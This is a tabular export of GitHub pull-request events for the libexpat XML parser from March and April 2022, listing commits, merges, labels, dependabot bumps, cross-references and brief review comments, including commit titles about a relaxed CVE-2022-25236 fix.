577,Revise,2022-03-04 15:54:01,hartwork,unfork_merge,lib: Relax fix to CVE-2022-25236 with regard to RFC 3986 URI characters,"{""sha"": ""2ba6c76fca21397959145e18c5ef376201209020"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-27T15:58:08Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T15:54:01Z""}}"
577,Revise,2022-03-04 15:54:01,hartwork,unfork_merge,tests: Cover relaxed fix to CVE-2022-25236,"{""sha"": ""e0f852db1e3b1e6d34922c68a653c3cc4b85361c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-03T16:29:54Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T15:54:01Z""}}"
577,Revise,2022-03-04 15:54:01,hartwork,unfork_merge,lib: Document namespace separator effect right in header <expat.h>,"{""sha"": ""5dd52182972a35f2251a07784eda35d3d52d3e07"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-01T22:02:34Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T15:54:01Z""}}"
577,Revise,2022-03-04 15:56:22,hartwork,unfork_merge,Changes: Document #572 and #577,"{""sha"": ""9579f7ea293e19d7b387de2690f8318611e0e77d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-01T22:29:19Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T15:56:22Z""}}"
577,Revise,2022-03-04 15:56:22,hartwork,unfork_merge,lib|doc: Add a note on namespace URI validation,"{""sha"": ""c57bea96b73eee1c6d5e288f0f57efbf5238e49a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-01T22:04:52Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T15:56:22Z""}}"
577,HeadRefForcePushed,2022-03-04 15:57:56,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186091654"", ""commit_url"": null}"
577,MergePR,2022-03-04 17:43:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186729593"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f178826bb1e9c8ee23202f1be55ad4ac7b649e84""}"
577,DeleteBranch,2022-03-04 17:44:03,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186731586"", ""commit_url"": null}"
577,CrossReferenced,2022-03-04 19:28:21,hartwork,unfork_merge,Namespace separator ':' incompatible with Expat >=2.4.5 <2.4.7 security fixes,"{""reference"": {""url"": ""https://api.github.com/repos/martinblech/xmltodict/issues/289"", ""is_pull_request"": false}}"
577,CrossReferenced,2022-03-04 19:28:58,hartwork,unfork_merge,Switch namespace separator from colon to pipe (fixes #289),"{""reference"": {""url"": ""https://api.github.com/repos/martinblech/xmltodict/issues/290"", ""is_pull_request"": true}}"
577,CrossReferenced,2022-03-04 19:40:12,hartwork,unfork_merge,Expat changes causing issues,"{""reference"": {""url"": ""https://api.github.com/repos/OpenLEADR/openleadr-python/issues/105"", ""is_pull_request"": true}}"
577,CrossReferenced,2022-03-04 23:54:51,hartwork,unfork_merge, fast_xml requires Expat >=2.4.5 (or backported fixes) for secure operation,"{""reference"": {""url"": ""https://api.github.com/repos/processone/fast_xml/issues/46"", ""is_pull_request"": false}}"
577,CrossReferenced,2022-03-04 23:58:37,hartwork,unfork_merge,xmp3 requires Expat >=2.4.5 (or backported fixes) for secure operation,"{""reference"": {""url"": ""https://api.github.com/repos/BellerophonMobile/xmp3/issues/1"", ""is_pull_request"": false}}"
577,CrossReferenced,2022-03-05 09:54:45,exxamalte,unfork_merge,Crash with OOM?,"{""reference"": {""url"": ""https://api.github.com/repos/exxamalte/python-aio-georss-client/issues/29"", ""is_pull_request"": false}}"
577,CrossReferenced,2022-03-13 09:41:02,kalxas,unfork_merge,pycsw demo server error causes CI to break,"{""reference"": {""url"": ""https://api.github.com/repos/geopython/pycsw/issues/736"", ""is_pull_request"": false}}"
577,CrossReferenced,2022-07-27 20:43:06,BrandonShar,unfork_merge,Manually specify namespace_separator ,"{""reference"": {""url"": ""https://api.github.com/repos/bellawatt/openleadr-python/issues/2"", ""is_pull_request"": true}}"
580,SubmitCommit,2022-03-04 17:46:01,hartwork,unfork_merge,"Bump version info from 9:6:8 to 9:7:8

See https://verbump.de/ for what these numbers do","{""sha"": ""c30b80ee9cabb122d90903a62a2cfe47e08f6956"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T17:46:01Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T17:46:01Z""}}"
580,SubmitCommit,2022-03-04 17:47:59,hartwork,unfork_merge,Bump version to 2.4.7,"{""sha"": ""a34daa5babf098e7577a6f6d93ce37ea1f85413c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T17:46:36Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T17:47:59Z""}}"
580,Labeled,2022-03-04 18:14:08,hartwork,unfork_merge,releasing,
580,OpenPR,2022-03-04 18:14:08,hartwork,unfork_merge,,
580,Revise,2022-03-04 18:16:16,hartwork,unfork_merge,Changes: Document #555 #570 #573 #574 #575 #579,"{""sha"": ""99eddcd2bbc69e8ba710a6da614326710191e816"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T18:04:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T18:16:16Z""}}"
580,Revise,2022-03-04 18:16:16,hartwork,unfork_merge,Sync file headers,"{""sha"": ""e07e39477157723af276abc3a3d04941abd589bb"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T18:07:57Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T18:16:16Z""}}"
580,Revise,2022-03-04 18:16:16,hartwork,unfork_merge,Set expected release date for 2.4.7,"{""sha"": ""c08d530920db924d5bd8b657bed4f089bc7c9a5c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T17:49:22Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T18:16:16Z""}}"
580,HeadRefForcePushed,2022-03-04 18:16:26,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6186891500"", ""commit_url"": null}"
580,MergePR,2022-03-04 19:41:48,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6187286005"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/17b258471d1a126b56cb2242b4f7b0bc98a170fd""}"
580,DeleteBranch,2022-03-04 19:42:29,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6187289539"", ""commit_url"": null}"
581,SubmitCommit,2022-03-04 20:22:31,hartwork,unfork_merge,win32: Fix version.rc destination in expat.iss,"{""sha"": ""c9e1ac00c6347e86c9ceac5f0a5c840b4de8f7ee"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T19:46:46Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T20:22:31Z""}}"
581,SubmitCommit,2022-03-04 20:22:31,hartwork,unfork_merge,Changes: Document #581,"{""sha"": ""c3e9dcfc6645d714f2366fb1c7f990f5ff96fe1a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T19:52:59Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-04T20:22:31Z""}}"
581,Labeled,2022-03-04 20:39:09,hartwork,unfork_merge,bug,
581,Labeled,2022-03-04 20:39:09,hartwork,unfork_merge,compilation,
581,Labeled,2022-03-04 20:39:09,hartwork,unfork_merge,windows,
581,OpenPR,2022-03-04 20:39:09,hartwork,unfork_merge,,
581,RenameTitle,2022-03-04 20:39:38,hartwork,unfork_merge,,"{""rename"": {""from"": ""Fix windows installer (fixes #555, follow-up to #570)"", ""to"": ""Fix windows installer (related to #555, follow-up to #570)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6187567701""}"
581,MergePR,2022-03-04 21:23:07,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6187796459"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/27d5b8ba1771f916d9cfea2aac6bdac72071dc66""}"
581,DeleteBranch,2022-03-04 21:25:32,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6187809481"", ""commit_url"": null}"
581,CrossReferenced,2022-03-04 21:36:57,hartwork,unfork_merge,Release Expat 2.4.7,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/578"", ""is_pull_request"": false}}"
582,OpenPR,2022-03-07 02:19:01,hartwork,unfork_merge,,
582,Labeled,2022-03-07 02:19:02,hartwork,unfork_merge,enhancement,
582,CrossReferenced,2022-03-07 02:21:30,hartwork,unfork_merge,macOS: dylib compatibility/current version inconsistency between CMake and Autotools,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/55"", ""is_pull_request"": false}}"
582,Revise,2022-03-07 02:31:21,hartwork,unfork_merge,CMake: Enforce library versioning compatible with GNU Libtool for macOS,"{""sha"": ""f00c5857f9c0f9ff3f550d7f35a921c4ae7eadad"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-07T02:04:13Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-07T02:31:21Z""}}"
582,Referenced,2022-03-07 02:32:02,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6191633838"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/814d15e040f5f1415a2fbbe1594e5ff62a8d34b3""}"
582,HeadRefForcePushed,2022-03-07 02:32:02,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6191633857"", ""commit_url"": null}"
582,Revise,2022-03-07 17:11:29,hartwork,unfork_merge,Changes: Document #55 and #582,"{""sha"": ""707cea189846f1836c35f8d02f5b28f863378447"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-07T02:16:18Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-07T17:11:29Z""}}"
582,HeadRefForcePushed,2022-03-07 17:11:47,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6196595519"", ""commit_url"": null}"
582,MergePR,2022-03-09 19:33:21,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6212493801"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/bccf36869d4fb683fc01842e0d5d967cfcbcd039""}"
582,DeleteBranch,2022-03-24 15:21:51,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6300417539"", ""commit_url"": null}"
583,SubmitCommit,2022-03-07 12:05:16,dependabot[bot],unfork_merge,"Actions(deps): Bump actions/checkout from 2.4.0 to 3

Bumps [actions/checkout](https://github.com/actions/checkout) from 2.4.0 to 3.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2.4.0...v3)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-major
...

Signed-off-by: dependabot[bot] <support@github.com>","{""sha"": ""3e200940b07327bb196c675da3e02f0d40dd26fb"", ""author"": {""name"": ""dependabot[bot]"", ""email"": ""49699333+dependabot[bot]@users.noreply.github.com"", ""date"": ""2022-03-07T12:05:16Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-03-07T12:05:16Z""}}"
583,OpenPR,2022-03-07 12:05:17,dependabot[bot],unfork_merge,,
583,Labeled,2022-03-07 12:05:18,dependabot[bot],unfork_merge,enhancement,
583,MergePR,2022-03-07 18:54:44,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6197235034"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/53fbdf5b8925a426e1b41a9e09b833986b87524e""}"
583,DeleteBranch,2022-03-07 18:54:53,dependabot[bot],unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6197235985"", ""commit_url"": null}"
584,SubmitCommit,2022-03-07 12:05:18,dependabot[bot],unfork_merge,"Actions(deps): Bump actions/upload-artifact from 2.3.1 to 3

Bumps [actions/upload-artifact](https://github.com/actions/upload-artifact) from 2.3.1 to 3.
- [Release notes](https://github.com/actions/upload-artifact/releases)
- [Commits](https://github.com/actions/upload-artifact/compare/v2.3.1...v3)

---
updated-dependencies:
- dependency-name: actions/upload-artifact
  dependency-type: direct:production
  update-type: version-update:semver-major
...

Signed-off-by: dependabot[bot] <support@github.com>","{""sha"": ""f1205b29146a1f82ee0464eb86997c26bd2b5281"", ""author"": {""name"": ""dependabot[bot]"", ""email"": ""49699333+dependabot[bot]@users.noreply.github.com"", ""date"": ""2022-03-07T12:05:18Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-03-07T12:05:18Z""}}"
584,Labeled,2022-03-07 12:05:19,dependabot[bot],unfork_merge,enhancement,
584,OpenPR,2022-03-07 12:05:19,dependabot[bot],unfork_merge,,
584,MergePR,2022-03-07 18:54:36,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6197234228"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f02c23a0214a90d32f3aac130da38b956dc423df""}"
584,DeleteBranch,2022-03-07 18:54:43,dependabot[bot],unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6197234916"", ""commit_url"": null}"
586,OpenPR,2022-03-24 15:24:56,hartwork,unfork_merge,,
586,Labeled,2022-03-24 15:25:08,hartwork,unfork_merge,enhancement,
586,Revise,2022-03-24 17:21:29,hartwork,unfork_merge,Actions: Migrate off moving Git tags,"{""sha"": ""bc42b64076652a8d1ba65abe9ea170701da2010e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T15:23:54Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T17:21:29Z""}}"
586,HeadRefForcePushed,2022-03-24 17:21:47,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6301284743"", ""commit_url"": null}"
586,MergePR,2022-03-25 13:59:32,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6307512157"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/5764f867d40e43e0e8d56e7645c3f1ed5631ba41""}"
586,DeleteBranch,2022-03-25 16:07:20,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6308396699"", ""commit_url"": null}"
587,SubmitCommit,2022-03-24 15:29:58,hartwork,unfork_merge,"pkg-config: Move ""-lm"" from section ""Libs"" to section ""Libs.private""","{""sha"": ""896e94000c05cfc5dae539b4259952e1403d1b9a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T15:29:58Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T15:29:58Z""}}"
587,SubmitCommit,2022-03-24 15:36:29,hartwork,unfork_merge,"CMake: Fix pkg-config section ""Libs"" for MSVC","{""sha"": ""7165ae8bff9d26fb4b6289d709cf758b65e54c8c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T15:36:29Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T15:36:29Z""}}"
587,SubmitCommit,2022-03-24 15:41:18,hartwork,unfork_merge,Changes: Document #587,"{""sha"": ""cbd4807ea659e331b9303de463fec486e0eeb1e2"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T15:41:18Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T15:41:18Z""}}"
587,Labeled,2022-03-24 15:43:25,hartwork,unfork_merge,bug,
587,OpenPR,2022-03-24 15:43:25,hartwork,unfork_merge,,
587,CrossReferenced,2022-03-24 15:47:53,hartwork,unfork_merge,[expat]update to 2.4.8,"{""reference"": {""url"": ""https://api.github.com/repos/microsoft/vcpkg/issues/22575"", ""is_pull_request"": true}}"
587,ReviewApproved,2022-03-28 13:35:01,dg0yt,unfork_merge,"LGTM.
Tested with vcpkg port in `--head` mode, with this PR's patch added, with static and dynamic mingw, manual check of installed file names and pc file contents.","{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/587#pullrequestreview-923159866""}"
587,IssueComment,2022-03-28 13:51:59,hartwork,unfork_merge,@dg0yt thank you!,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1080680082"", ""author_association"": ""MEMBER""}"
587,MergePR,2022-03-28 13:52:03,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6318736324"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f1fd4b6d4a68a8128b46af77c139c69263693caa""}"
587,DeleteBranch,2022-03-28 13:56:24,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6318773691"", ""commit_url"": null}"
588,SubmitCommit,2022-03-24 15:51:44,hartwork,unfork_merge,Actions: Make robust toward outdated images,"{""sha"": ""95397f52e49662e2b55a310eb797eafb9e49de39"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T15:50:57Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-24T15:51:44Z""}}"
588,OpenPR,2022-03-24 15:52:15,hartwork,unfork_merge,,
588,Labeled,2022-03-24 15:52:38,hartwork,unfork_merge,enhancement,
588,MergePR,2022-03-24 17:21:02,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6301280088"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/540c7eb7078b52d5980db444e3138c8f87370ba1""}"
588,DeleteBranch,2022-03-24 17:21:34,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6301283451"", ""commit_url"": null}"
589,Labeled,2022-03-25 01:32:11,hartwork,unfork_merge,enhancement,
589,OpenPR,2022-03-25 01:32:11,hartwork,unfork_merge,,
589,Revise,2022-03-25 13:58:25,hartwork,unfork_merge,Actions: Upgrade Clang from 13 to 14,"{""sha"": ""ef31c8681eeae39ce23e4efd4cf718ae23403b79"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-25T01:27:53Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-25T13:58:25Z""}}"
589,Revise,2022-03-25 13:58:25,hartwork,unfork_merge,"Actions: Resolve hardcoding of ""bionic"" for maintainability","{""sha"": ""0684e6e183725dc0f46ddab8ffbe6fc9d7394054"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-25T01:30:25Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-25T13:58:25Z""}}"
589,HeadRefForcePushed,2022-03-25 13:59:17,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6307510262"", ""commit_url"": null}"
589,MergePR,2022-03-25 16:06:41,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6308392273"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/011c4b5a5c53c38aaa3595c3a8a2b0f887668b48""}"
589,DeleteBranch,2022-03-25 16:07:20,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6308396748"", ""commit_url"": null}"
591,SubmitCommit,2022-03-28 14:01:01,hartwork,unfork_merge,"Bump version info from 9:7:8 to 9:8:8

See https://verbump.de/ for what these numbers do","{""sha"": ""44c2a9470a24cb45973b83f95fcd0c361431ab17"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-28T13:59:19Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-28T14:01:01Z""}}"
591,SubmitCommit,2022-03-28 14:49:52,hartwork,unfork_merge,Bump version to 2.4.8,"{""sha"": ""24ae16273bce6fb57f13ca864cf9b8d28974fc6e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-28T14:48:01Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-28T14:49:52Z""}}"
591,SubmitCommit,2022-03-28 14:52:39,hartwork,unfork_merge,Sync file headers,"{""sha"": ""8a2372147541171de35cf126f8419ddd7479af5d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-28T14:52:39Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-28T14:52:39Z""}}"
591,SubmitCommit,2022-03-28 14:57:36,hartwork,unfork_merge,Set expected release date for 2.4.8,"{""sha"": ""8902f86c3916cce6189b7b2be90c37942b9b0e42"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-28T14:57:36Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-03-28T14:57:36Z""}}"
591,Labeled,2022-03-28 15:14:15,hartwork,unfork_merge,releasing,
591,OpenPR,2022-03-28 15:14:15,hartwork,unfork_merge,,
591,MergePR,2022-03-28 21:11:38,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6321751254"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/3bab6c09bbe8bf42d84b81563ddbcf4cca4be838""}"
591,DeleteBranch,2022-03-28 21:11:58,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6321753644"", ""commit_url"": null}"
593,SubmitCommit,2022-03-30 12:29:20,orbitcowboy,fork_merge,"Assign LPVOID pointer with NULL before it's being used

This fixes https://github.com/libexpat/libexpat/issues/592","{""sha"": ""399a65e63714983c353ef6d0b70399c9494152ce"", ""author"": {""name"": ""orbitcowboy"", ""email"": ""ettl.martin78@googlemail.com"", ""date"": ""2022-03-30T12:29:20Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-03-30T12:29:20Z""}}"
593,OpenPR,2022-03-30 12:30:10,orbitcowboy,fork_merge,,
593,CrossReferenced,2022-03-30 12:30:36,orbitcowboy,fork_merge,Always initialize pointer with NULL,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/592"", ""is_pull_request"": false}}"
593,Labeled,2022-03-30 12:31:26,hartwork,fork_merge,windows,
593,MergePR,2022-03-30 13:02:15,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6334938297"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f1b05559cc5291a87dcdca8e139b2d432ac207f3""}"
593,Labeled,2022-03-30 13:02:28,hartwork,fork_merge,enhancement,
593,Referenced,2022-09-15 15:05:00,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395915674"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ab59255a023d7b771f5beea2eaa976293866c758""}"
593,Referenced,2022-09-19 14:22:45,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414154989"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c""}"
594,SubmitCommit,2022-04-01 14:37:13,orbitcowboy,fork_merge,Fixed typo in nsattcmp attribute handling,"{""sha"": ""4ead0836c56c906e1f3df04af7c5a5d5afa58d82"", ""author"": {""name"": ""orbitcowboy"", ""email"": ""ettl.martin78@googlemail.com"", ""date"": ""2022-04-01T14:37:13Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-04-01T14:37:13Z""}}"
594,OpenPR,2022-04-01 14:38:01,orbitcowboy,fork_merge,,
594,RenameTitle,2022-04-01 14:47:00,hartwork,fork_merge,,"{""rename"": {""from"": ""Fixed typo in nsattcmp attribute handling"", ""to"": ""Fixed variable mix-up in nsattcmp attribute handling""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6353048137""}"
594,ReviewApproved,2022-04-01 14:52:53,hartwork,fork_merge,"@orbitcowboy interesting catch! :+1: This variable mix-up looked scary to me at first, but after a closer look it seems that following `tcscmp(att1, att2)` will catch those cases for free (due to `NSSEP` not being the null terminator) and hence we still get proper `<0`, `==0`, `>0` return values for all cases of input, as expected by `qsort`. If you see a true bugfix affecting runtime behavior here, please let me know. Thanks! :pray: ","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/594#pullrequestreview-929049933""}"
594,IssueComment,2022-04-01 15:14:10,orbitcowboy,fork_merge,There is no bad runtime behavior on my side. I just saw it while scrolling down ;-) ,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1086023679"", ""author_association"": ""CONTRIBUTOR""}"
594,IssueComment,2022-04-01 15:15:36,hartwork,fork_merge,"@orbitcowboy I see, thanks for your reply! :+1: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1086025218"", ""author_association"": ""MEMBER""}"
594,MergePR,2022-04-01 15:15:42,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6353276897"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/e55290c77f83e6e5c7718e6b2aa5436b61a83ae8""}"
594,Labeled,2022-04-01 15:15:50,hartwork,fork_merge,enhancement,
594,RenameTitle,2022-04-01 15:16:16,hartwork,fork_merge,,"{""rename"": {""from"": ""Fixed variable mix-up in nsattcmp attribute handling"", ""to"": ""xmlwf: Fixed variable mix-up in nsattcmp attribute handling""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6353280758""}"
594,Referenced,2022-09-15 15:05:00,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395915685"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ab59255a023d7b771f5beea2eaa976293866c758""}"
594,Referenced,2022-09-19 14:22:46,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414155000"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c""}"
595,SubmitCommit,2022-04-01 15:57:04,orbitcowboy,fork_merge,[STYLE] Added parentheses around macro argument,"{""sha"": ""a100d0132d663072327c67d8bd7fb677d61c8a75"", ""author"": {""name"": ""orbitcowboy"", ""email"": ""ettl.martin78@googlemail.com"", ""date"": ""2022-04-01T15:57:04Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-04-01T15:57:04Z""}}"
595,OpenPR,2022-04-01 15:57:30,orbitcowboy,fork_merge,,
595,ReviewApproved,2022-04-01 16:00:07,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/595#pullrequestreview-929139658""}"
595,Labeled,2022-04-01 16:00:33,hartwork,fork_merge,enhancement,
